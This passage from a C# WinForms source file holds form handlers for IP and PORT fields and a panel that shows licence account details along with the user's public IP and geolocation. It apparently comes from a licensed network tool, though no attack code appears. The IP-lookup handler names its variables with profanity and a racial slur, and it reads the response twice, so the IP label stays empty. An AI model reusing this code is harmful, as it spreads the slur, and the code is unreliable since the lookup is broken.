                host.Text = "IP";
                host.ForeColor = Color.Silver;
            }
        }

        private void port_Enter(object sender, EventArgs e)
        {
            if (port.Text == "PORT")
            {
                port.Text = "";
                port.ForeColor = Color.Yellow;
            }
        }

        private void port_Leave(object sender, EventArgs e)
        {
            if (port.Text == "")
            {
                port.Text = "PORT";
                port.ForeColor = Color.Silver;
            }
        }

        private void label8_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void logInOnOffSwitch1_ToggleChanged(object sender)
        {
            
        }

        private void bunifuSwitch1_Click(object sender, EventArgs e)
        {
            if (bunifuSwitch1.Value == true)
            {
                richTextBox2.Text = "Account Expiry -> " + "****************" + "\n" + "\n" + "Username -> " + "****************" + "\n" + "\n" + "Email -> " + "****************" + "\n" + "\n" + "Account Level -> " + "****************" + "\n" + "\n" + "Membership Type -> " + "****************" + "\n" + "\n" + "Registered IP -> " + "****************" + "\n" + "\n" + "Hostname -> " + "****************" + "\n" + "ISP -> " + "****************" + "\n" + "Country -> " + "****************" + "\n" + "State -> " + "****************" + "\n" + "City -> " + "****************"; ;
            }
            else if (bunifuSwitch1.Value == false)
            {
                var fuck = "https://api.ipify.org/";
                var you = (HttpWebRequest)WebRequest.Create(fuck);
                var bitch = (HttpWebResponse)you.GetResponse();
                var ass = bitch.GetResponseStream();
                var nigga = new StreamReader(ass);
                nigga.ReadToEnd();
                label9.Text = nigga.ReadToEnd();
                string hostname = wc.DownloadString("http://ip-api.com/line/" + label9.Text + "?fields=4096");
                string isp = wc.DownloadString("http://ip-api.com/line/" + label9.Text + "?fields=512");
                string country = wc.DownloadString("http://ip-api.com/line/" + label9.Text + "?fields=1");
                string state = wc.DownloadString("http://ip-api.com/line/" + label9.Text + "?fields=8");
                string city = wc.DownloadString("http://ip-api.com/line/" + label9.Text + "?fields=16");
                richTextBox2.Text = "Account Expiry -> " + TrinitySeal.UserInfo.Expires + "\n" + "\n" + "Username -> " + TrinitySeal.UserInfo.Username + "\n" + "\n" + "Email -> " + TrinitySeal.UserInfo.Email + "\n" + "\n" + "Account Level -> " + TrinitySeal.UserInfo.Level + "\n" + "\n" + "Membership Type -> " + test + "\n" + "\n" + "Registered IP -> " + TrinitySeal.UserInfo.IP + "\n" + "\n" + "Hostname -> " + hostname + "\n" + "ISP -> " + isp + "\n" + "Country -> " + country + "\n" + "State -> " + state + "\n" + "City -> " + city; ;
            }
        }

        private void logInOnOffSwitch1_ToggleChanged_1(object sender)
        {
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            apiservstatus api = new apiservstatus();
            api.Show();
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            tos tos = new tos();
            tos.Show();
        }

        private void History_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
